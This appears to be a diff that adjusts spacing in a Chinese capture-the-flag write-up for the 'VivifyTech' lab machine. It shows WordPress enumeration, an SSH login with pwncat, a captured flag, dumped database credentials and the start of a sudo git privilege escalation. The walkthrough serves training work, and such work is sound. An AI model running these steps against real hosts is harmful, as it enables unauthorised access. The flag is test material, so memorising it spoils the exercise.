@@ -149,7 +149,7 @@ PORT      STATE SERVICE VERSION
  |  Login Error Messages (Aggressive Detection)
 ```
 
-同时对wordpress常见目录进行探测，发现以下文件
+同时对 wordpress 常见目录进行探测，发现以下文件
 
 ```plaintext title="http://192.168.56.103/wordpress/wp-includes/secrets.txt"
 agonglo
@@ -202,7 +202,7 @@ Akenzua
 Edoculture
 ```
 
-同时在`http://192.168.56.103/wordpress/index.php/2023/12/05/the-story-behind-vivifytech/`这篇文章中，发现多个用户名
+同时在 `http://192.168.56.103/wordpress/index.php/2023/12/05/the-story-behind-vivifytech/` 这篇文章中，发现多个用户名
 
 ```plaintext
 sarah
@@ -228,7 +228,7 @@ sancelisso
 ```shell
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs sarah@192.168.56.103
-[19:59:22] Welcome to pwncat 
+[19:59:22] Welcome to pwncat
 Password: *******
 [19:59:25] 192.168.56.103:22: normalizing shell path
            192.168.56.103:22: registered new host w/ db
@@ -240,7 +240,7 @@ sarah
 ### flag - user
 
 ```shell
-(remote) sarah@VivifyTech:/home/sarah$ cat user.txt 
+(remote) sarah@VivifyTech:/home/sarah$ cat user.txt
 HMV{Y0u_G07_Th15_0ne_6543}
 ```
 
@@ -250,16 +250,16 @@ HMV{Y0u_G07_Th15_0ne_6543}
 ......
 // ** Database settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
-define( 'DB_NAME', 'wordpress' );
+define('DB_NAME', 'wordpress');
 
 /** Database username */
-define( 'DB_USER', 'wordpress' );
+define('DB_USER', 'wordpress');
 
 /** Database password */
-define( 'DB_PASSWORD', 'password' );
+define('DB_PASSWORD', 'password');
 
 /** Database hostname */
-define( 'DB_HOST', 'localhost' );
+define('DB_HOST', 'localhost');
 ......
 ```
 
@@ -294,7 +294,7 @@ mysql> show tables;
 +-----------------------+
 ```
 
-### `.private`目录下存在备忘录
+### `.private` 目录下存在备忘录
 
 ```plaintext title="/home/sarah/.private/Tasks.txt"
 - Change the Design and architecture of the website
@@ -305,7 +305,7 @@ mysql> show tables;
 
 ## User - gbodja
 
-检测到sudo存在特权程序
+检测到 sudo 存在特权程序
 
 ```plaintext title="sudo -l"
 Matching Defaults entries for gbodja on VivifyTech:
@@ -315,7 +315,7 @@ User gbodja may run the following commands on VivifyTech:
     (ALL) NOPASSWD: /usr/bin/git
 ```
 
-尝试利用git提权
+尝试利用 git 提权
 
 ```shell
 gbodja@VivifyTech:~$ sudo -u root /usr/bin/git help config
